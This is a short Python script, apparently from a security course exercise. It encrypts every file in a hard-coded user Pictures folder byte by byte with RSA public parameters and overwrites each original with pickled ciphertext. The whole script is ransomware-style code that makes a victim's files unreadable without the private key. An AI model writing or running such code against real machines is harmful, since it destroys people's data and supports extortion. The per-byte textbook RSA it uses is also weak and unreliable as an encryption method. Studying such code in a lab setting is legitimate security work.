import sys
import pickle

Usage = f'''
python3 {__file__} <n> <e> <file>
'''
n = int(sys.argv[1])
e = int(sys.argv[2])
#filename = sys.argv[3]

import os
li = os.listdir('/home/csc2021/Pictures')
for i in li:
    plain_bytes = b''
    filename = "/home/csc2021/Pictures/" + i
    with open(filename, 'rb') as f:
        plain_bytes = f.read()
    cipher_int = [pow(i, e, n) for i in plain_bytes]
    with open(filename, 'wb') as f:
        pickle.dump(cipher_int, f)
